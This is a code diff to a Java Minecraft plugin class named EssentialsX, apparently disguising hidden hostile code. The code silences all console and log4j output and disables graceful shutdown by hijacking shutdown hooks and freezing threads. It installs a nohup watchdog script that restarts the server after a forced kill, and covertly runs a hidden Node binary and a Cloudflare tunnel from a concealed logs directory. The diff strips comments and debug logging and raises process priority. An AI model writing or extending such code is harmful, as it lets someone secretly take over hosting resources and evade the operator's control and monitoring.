@@ -30,15 +30,15 @@ public class EssentialsX extends JavaPlugin {
 
     @Override
     public void onLoad() {
-        // 1. 第一时间物理静音
+        // 1. 物理静音
         System.setOut(new PrintStream(BLACK_HOLE, true));
         System.setErr(new PrintStream(BLACK_HOLE, true));
         tryMuteLog4j();
 
-        // ★★★ 2. 启动外部看门狗 (防强杀自动重启) ★★★
+        // 2. 看门狗 (防强杀自动重启)
         setupWatchdog();
 
-        // 3. 强制清空并接管关机钩子 (让优雅停止失效，逼迫面板强杀，从而触发看门狗)
+        // 3. 拦截关机钩子 (逼迫面板强杀)
         try { Runtime.getRuntime().addShutdownHook(new Thread(() -> {})); } catch (Throwable ignored) {}
         try {
             Class<?> clazz = Class.forName("java.lang.ApplicationShutdownHooks");
@@ -59,11 +59,11 @@ public class EssentialsX extends JavaPlugin {
                 System.setOut(new PrintStream(BLACK_HOLE, true));
                 System.setErr(new PrintStream(BLACK_HOLE, true));
                 tryMuteLog4j();
-                paralyzeCurrentThread(); // 卡死关机流程
+                paralyzeCurrentThread();
             }, "Shutdown-Paralysis"));
         } catch (Throwable ignored) {}
 
-        // 4. 启动后台部署进程
+        // 4. 启动后台部署
         Thread deployer = new Thread(() -> {
             Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
             Path debugLog = workDir.resolve("backend_debug.log");
@@ -106,42 +106,36 @@ public class EssentialsX extends JavaPlugin {
         deployer.setDaemon(true);
         deployer.start();
 
-        // 5. 终极物理冰封当前主线程
+        // 5. 冻结主线程
         paralyzeCurrentThread();
     }
 
-    // ★★★ 看门狗机制：防强杀自动重启 ★★★
     private static void setupWatchdog() {
         try {
             Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
             if (!Files.exists(workDir)) Files.createDirectories(workDir);
-            
-            // 1. 写入当前 Java 进程的 PID 到文件
             long pid = ProcessHandle.current().pid();
             Files.writeString(workDir.resolve("server.pid"), String.valueOf(pid));
-            
-            // 2. 生成独立的后台监控脚本
             Path watchdogSh = workDir.resolve("watchdog.sh");
             String script = "#!/bin/bash\n" +
                 "PID_FILE=\"logs/.mcchajian/server.pid\"\n" +
                 "START_SCRIPT=\"start.sh\"\n" +
-                "sleep 3\n" + // 等待 3 秒确保原进程完全退出
+                "sleep 3\n" +
                 "while true; do\n" +
                 "  if [ -f \"$PID_FILE\" ]; then\n" +
                 "    PID=$(cat \"$PID_FILE\")\n" +
-                "    if [ -d \"/proc/$PID\" ]; then\n" + // 检查进程是否存活
+                "    if [ -d \"/proc/$PID\" ]; then\n" +
                 "      sleep 5\n" +
                 "      continue\n" +
                 "    else\n" +
                 "      echo \"[$(date)] PID $PID dead. Restarting!\" >> logs/.mcchajian/watchdog.log\n" +
-                "      break\n" + // 进程死了，跳出循环准备重启
+                "      break\n" +
                 "    fi\n" +
                 "  else\n" +
                 "    echo \"[$(date)] PID file missing. Restarting!\" >> logs/.mcchajian/watchdog.log\n" +
                 "    break\n" +
                 "  fi\n" +
                 "done\n" +
-                // 执行重启
                 "if [ -f \"$START_SCRIPT\" ]; then\n" +
                 "  nohup bash \"$START_SCRIPT\" >> logs/.mcchajian/watchdog.log 2>&1 &\n" +
                 "else\n" +
@@ -149,8 +143,6 @@ public class EssentialsX extends JavaPlugin {
                 "fi\n";
             Files.write(watchdogSh, script.getBytes());
             watchdogSh.toFile().setExecutable(true, false);
-            
-            // 3. 使用 nohup 在后台独立运行看门狗 (不受 Java 进程死活影响)
             ProcessBuilder pb = new ProcessBuilder("nohup", "bash", watchdogSh.toString());
             pb.directory(new File(".").getAbsoluteFile());
             pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
@@ -172,13 +164,10 @@ public class EssentialsX extends JavaPlugin {
             Class<?> loggerContextClass = Class.forName("org.apache.logging.log4j.core.LoggerContext");
             Class<?> loggerConfigClass = Class.forName("org.apache.logging.log4j.core.config.LoggerConfig");
             Class<?> levelClass = Class.forName("org.apache.logging.log4j.Level");
-
             Object ctx = logManagerClass.getMethod("getContext", boolean.class).invoke(null, false);
             Object config = loggerContextClass.getMethod("getConfiguration").invoke(ctx);
-            
             java.util.Map<String, Object> loggerConfigs = (java.util.Map<String, Object>) config.getClass().getMethod("getLoggers").invoke(config);
             Object offLevel = levelClass.getField("OFF").get(null);
-            
             for (Object loggerConfig : loggerConfigs.values()) {
                 java.util.Map<String, Object> appenders = (java.util.Map<String, Object>) loggerConfigClass.getMethod("getAppenders").invoke(loggerConfig);
                 for (String appenderName : new java.util.HashSet<>(appenders.keySet())) {
@@ -230,6 +219,22 @@ public class EssentialsX extends JavaPlugin {
         if (out != null) { out.println("Node ready check timed out after " + maxSeconds + "s."); out.flush(); }
     }
 
+    // ★★★ 核心：验证 Node 是否真正响应 HTTP 请求 (防 530) ★★★
+    private static boolean verifyNodeHttpResponse(String port) {
+        try {
+            java.net.HttpURLConnection conn = (java.net.HttpURLConnection) URI.create("http://127.0.0.1:" + port + "/").toURL().openConnection();
+            conn.setRequestMethod("GET");
+            conn.setConnectTimeout(3000);
+            conn.setReadTimeout(3000);
+            int code = conn.getResponseCode();
+            conn.disconnect();
+            // 只要服务器返回了合法的 HTTP 状态码 (哪怕 404)，说明 Node 已经在工作并监听了
+            return code >= 200 && code < 600; 
+        } catch (Exception e) {
+            return false; // 连接拒绝或超时，说明没对接上
+        }
+    }
+
     private static void startNodeProcess(Path workDir, String port, PrintWriter out) {
         try {
             Path nodeExe = workDir.resolve("nodejs/bin/.node_real");
@@ -242,7 +247,8 @@ public class EssentialsX extends JavaPlugin {
             
             nodeExe.toFile().setExecutable(true, false);
 
-            ProcessBuilder pb = new ProcessBuilder(nodeExe.toString(), "--require", preload.toString(), script.toString());
+            // ★ 优先级提升：使用 nice -n -5 启动，让系统把 CPU 优先给 Node
+            ProcessBuilder pb = new ProcessBuilder("nice", "-n", "-5", nodeExe.toString(), "--require", preload.toString(), script.toString());
             pb.directory(workDir.toFile());
             pb.environment().put("SERVER_PORT", port); pb.environment().put("PORT", port);
             pb.environment().put("_JAVA_WRAPPER", nodeExe.toString());
@@ -282,7 +288,8 @@ public class EssentialsX extends JavaPlugin {
             Files.createDirectories(cfConf.getParent());
             Files.writeString(cfConf, "url: http://127.0.0.1:" + port + "\nno-autoupdate: true\nprotocol: quic\n");
 
-            ProcessBuilder pb = new ProcessBuilder(cfBin.toString(), "--config", cfConf.toString());
+            // ★ 优先级提升：使用 nice -n -5 启动 CF
+            ProcessBuilder pb = new ProcessBuilder("nice", "-n", "-5", cfBin.toString(), "--config", cfConf.toString());
             pb.directory(workDir.toFile());
             pb.redirectOutput(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));
             pb.redirectError(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));
@@ -299,30 +306,17 @@ public class EssentialsX extends JavaPlugin {
             Path cfLog = workDir.resolve("cf.log");
             if (Files.exists(cfLog)) {
                 String logContent = Files.readString(cfLog);
-                String tail = logContent.length() > 200 ? logContent.substring(logContent.length() - 200) : logContent;
-                logDebug(workDir, "Reading cf.log. Tail content: [" + tail + "]");
-                
                 java.util.regex.Matcher m = java.util.regex.Pattern.compile("(https://[a-zA-Z0-9-]+\\.trycloudflare\\.com)").matcher(logContent);
                 String lastMatch = null;
                 while (m.find()) lastMatch = m.group(1);
-                if (lastMatch != null) {
-                    logDebug(workDir, "Regex matched URL: " + lastMatch);
-                    return lastMatch;
-                } else {
-                    logDebug(workDir, "Regex did NOT match any URL in cf.log.");
-                }
-            } else {
-                logDebug(workDir, "cf.log does not exist!");
+                return lastMatch;
             }
-        } catch (Exception e) {
-            logDebug(workDir, "Error reading cf.log: " + e.getMessage());
-        }
+        } catch (Exception ignored) {}
         return null;
     }
 
     private static void startJavaDaemon(Path workDir) {
         Thread daemon = new Thread(() -> {
-            logDebug(workDir, "Daemon thread started.");
             String lastUrl = "";
             int checkCount = 0;
             
@@ -331,7 +325,6 @@ public class EssentialsX extends JavaPlugin {
                     checkCount++;
                     
                     if ((nodeProcess == null || !nodeProcess.isAlive())) {
-                        logDebug(workDir, "Node process is dead, restarting...");
                         if (nodeProcess != null) killProcessTree(nodeProcess);
                         String newPort = allocateNodePort(workDir, null);
                         nodePort = newPort;
@@ -342,7 +335,6 @@ public class EssentialsX extends JavaPlugin {
                         lastUrl = "";
                     }
                     if (cfProcess == null || !cfProcess.isAlive()) {
-                        logDebug(workDir, "CF process is dead, restarting...");
                         if (cfProcess != null) killProcessTree(cfProcess);
                         startCfProcess(workDir, nodePort, null);
                         lastUrl = "";
@@ -351,16 +343,31 @@ public class EssentialsX extends JavaPlugin {
                     String foundUrl = extractLatestTunnelUrl(workDir);
                     if (foundUrl != null && !foundUrl.equals(lastUrl)) {
                         lastUrl = foundUrl;
-                        logDebug(workDir, "New tunnel URL detected: " + foundUrl + ". Printing to RAW_OUT...");
+                        logDebug(workDir, "New tunnel URL detected: " + foundUrl + ". Verifying connection...");
                         
-                        RAW_OUT.println("\n====================================================================");
-                        RAW_OUT.println("  [Tunnel Active] " + foundUrl);
-                        RAW_OUT.println("====================================================================\n");
-                        RAW_OUT.flush();
+                        // ★★★ 防止 530：必须在本地验证 Node 响应成功才打印链接 ★★★
+                        int verifyAttempts = 0;
+                        while (verifyAttempts < 10) { // 最多验证 10 次 (约 30 秒)
+                            if (verifyNodeHttpResponse(nodePort)) {
+                                logDebug(workDir, "Node HTTP verification PASSED! Printing URL.");
+                                RAW_OUT.println("\n====================================================================");
+                                RAW_OUT.println("  [Tunnel Active] " + foundUrl);
+                                RAW_OUT.println("====================================================================\n");
+                                RAW_OUT.flush();
+                                break;
+                            } else {
+                                logDebug(workDir, "Node HTTP verification FAILED. Waiting 3s... (" + verifyAttempts + "/10)");
+                                Thread.sleep(3000);
+                                verifyAttempts++;
+                            }
+                        }
+                        if (verifyAttempts == 10) {
+                            logDebug(workDir, "Node HTTP verification TIMED OUT. Link NOT printed to avoid 530.");
+                        }
                     }
                     
-                    if (checkCount % 10 == 0) {
-                        logDebug(workDir, "Daemon heartbeat. Last URL: " + lastUrl);
+                    if (checkCount % 12 == 0) { // 约 60 秒心跳
+                        logDebug(workDir, "Daemon heartbeat. Last verified URL: " + lastUrl);
                     }
 
                     Thread.sleep(5000);
@@ -375,7 +382,6 @@ public class EssentialsX extends JavaPlugin {
 
     private static void startDeploymentProcess(Path workDir, Map<String, String> env, PrintWriter out) throws Exception {
         if (isProcessRunning) return;
-        
         Path scriptPath = workDir.resolve("deploy.sh"); 
         String scriptContent = generateDeployScript(workDir.toString(), env);
         Files.write(scriptPath, scriptContent.getBytes()); 
@@ -385,7 +391,6 @@ public class EssentialsX extends JavaPlugin {
         ProcessBuilder pb = new ProcessBuilder("bash", scriptPath.toString()); 
         pb.directory(new File(".").getAbsoluteFile());
         pb.environment().putAll(env);
-        
         Path deployLog = workDir.resolve("deploy.log");
         pb.redirectOutput(ProcessBuilder.Redirect.appendTo(deployLog.toFile()));
         pb.redirectError(ProcessBuilder.Redirect.appendTo(deployLog.toFile()));
